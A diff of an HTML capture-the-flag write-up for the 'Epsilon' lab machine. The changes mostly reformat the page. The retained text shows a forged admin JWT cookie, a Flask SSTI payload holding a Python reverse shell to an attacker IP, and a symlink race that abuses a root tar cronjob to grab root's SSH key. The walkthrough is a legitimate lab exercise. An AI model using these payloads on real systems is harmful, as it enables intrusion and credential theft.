@@ -1,15 +1,30 @@
+<!--
+  REGLAS DE FORMATO:
+
+  1. Usar <code> solo para mostrar comandos o valores literales dentro del texto.
+     NO usar <code> en “Key steps” para palabras generales o acciones.
+  
+  2. Para salidas de comandos, directorios, o listados completos:
+     Agrupar todo dentro de un <pre><code> ... </code></pre>
+     en lugar de múltiples <code> dentro de <li>.
+
+  3. Cada bloque de “Key steps” debe ser texto simple, sin <code> en acciones, excepto comandos puntuales.
+  
+  4. Imágenes, capturas o resultados deben ir como <img src="..." alt="..."> con texto descriptivo.
+-->
+
 <h2>Overview</h2>
 <p>Epsilon is a medium-difficulty Linux machine that exposes a Git repository on the web server. During enumeration, AWS Lambda credentials leaked in previous commits are discovered. Using these credentials, we obtain the secret key used to sign JWTs in the Flask application, allowing us to generate admin cookies and access protected routes. Finally, root access is obtained by exploiting a cronjob that runs <code>tar -h</code>, allowing critical files to be replaced via symbolic links.</p>
 
 <h2>Key steps</h2>
 <ol>
-  <li>Full port scan with <code>nmap</code>.</li>
+  <li>Full port scan with nmap.</li>
   <li>Detailed scanning of open ports to identify services and versions.</li>
   <li>Enumeration of the web application and downloading the Git repository.</li>
   <li>Review of old commits to extract AWS Lambda credentials.</li>
   <li>Generation of an admin JWT token to access protected routes.</li>
   <li>Exploitation of SSTI in Flask to obtain an initial shell.</li>
-  <li>Privilege escalation using a cronjob with <code>tar -h</code> and symbolic links.</li>
+  <li>Privilege escalation using a cronjob with tar -h and symbolic links.</li>
 </ol>
 
 <h3>1. Port enumeration</h3>
@@ -45,16 +60,15 @@
 <h4>Files obtained from the Git dump</h4>
 <p>The Git dump includes the following important files and folders:</p>
 
-<ul>
-  <li><code>.git/</code> – Git metadata directory</li>
-  <li><code>HEAD</code></li>
-  <li><code>config</code></li>
-  <li><code>COMMIT_EDITMSG</code></li>
-  <li><code>index</code></li>
-  <li><code>refs/heads/master</code></li>
-  <li><code>logs/HEAD</code> and <code>logs/refs/heads/master</code></li>
-  <li>Various <code>objects/*</code> containing historical commits and blobs</li>
-</ul>
+<pre><code>.git/
+HEAD
+config
+COMMIT_EDITMSG
+index
+refs/heads/master
+logs/HEAD
+logs/refs/heads/master
+objects/*</code></pre>
 
 <p>The gitdumper log (cleaned up for readability) looks like this:</p>
 
@@ -78,19 +92,7 @@
 [-] Downloaded: /refs/wip/index/refs/heads/master
 [-] Downloaded: /refs/wip/wtree/refs/heads/master
 [+] Downloaded: objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91
-[-] Downloaded: objects/00/00000000000000000000000000000000000000
-[+] Downloaded: objects/7c/f92a7a09e523c1c667d13847c9ba22464412f3
-[+] Downloaded: objects/c5/1441640fd25e9fba42725147595b5918eba0f1
-[+] Downloaded: objects/b1/0dd06d56ac760efbbb5d254ea43bf9beb56d2d
-[+] Downloaded: objects/ce/401ccecf421ff19bf43fafe8a60a0d0f0682d0
-[+] Downloaded: objects/5c/52105750831385d4756111e1103957ac599d02
-[+] Downloaded: objects/b5/f4c99c772eeb629e53d284275458d75ed9a010
-[+] Downloaded: objects/ab/07f7cdc7f410b8c8f848ee5674ec550ecb61ca
-[+] Downloaded: objects/cf/489a3776d2bf87ac32de4579e852a4dc116ce8
-[+] Downloaded: objects/65/b80f62da28254f67f0bea392057fd7d2330e2d
-[+] Downloaded: objects/df/dfa17ca5701b1dca5069b6c3f705a038f4361e
-[+] Downloaded: objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630
-[+] Downloaded: objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca
+...
 [+] Downloaded: objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34</code></pre>
 
 <h4>Review of old commits</h4>
@@ -137,7 +139,7 @@ secret = 'VALUE_EXTRACTED_FROM_LAMBDA'
 token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
 print(token)</code></pre>
 
-<p>We place this token in the <code>auth</code> cookie to access admin routes:</p>
+<p>We place this token in the auth cookie to access admin routes:</p>
 
 <pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.11.134/home</code></pre>
 
@@ -158,11 +160,11 @@ print(token)</code></pre>
 
 <pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.10.14.36\',6969));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'/bin/bash\')"').read() }}</code></pre>
 
-<p>We obtain a shell and the first flag (<code>user.txt</code>):</p>
+<p>We obtain a shell and the first flag (user.txt):</p>
 <img src="writeups/img/epsilon/img6.png" alt="First flag obtained">
 
 <h3>5. Privilege escalation</h3>
-<p>Using <code>pspy</code>, we find a cronjob that runs <code>tar -h</code> every 5 seconds:</p>
+<p>Using pspy, we find a cronjob that runs tar -h every 5 seconds:</p>
 
 <pre><code>#!/bin/bash
 file=`date +%N`
@@ -174,7 +176,7 @@ check_file=`date +%N`
 /usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
 /usr/bin/rm -rf /opt/backups/*</code></pre>
 
-<p>We abuse <code>-h</code> to replace critical files using symbolic links:</p>
+<p>We abuse -h to replace critical files using symbolic links:</p>
 
 <pre><code>#!/bin/bash
 while true; do 
@@ -185,9 +187,9 @@ while true; do
     fi; 
 done</code></pre>
 
-<p>When the cronjob archives again with <code>-h</code>, root's private key is copied to an accessible location.</p>
+<p>When the cronjob archives again with -h, root's private key is copied to an accessible location.</p>
 
-<p>Example of extracting <code>id_rsa</code>:</p>
+<p>Example of extracting id_rsa:</p>
 
 <pre><code>cd /tmp
 ./root.sh
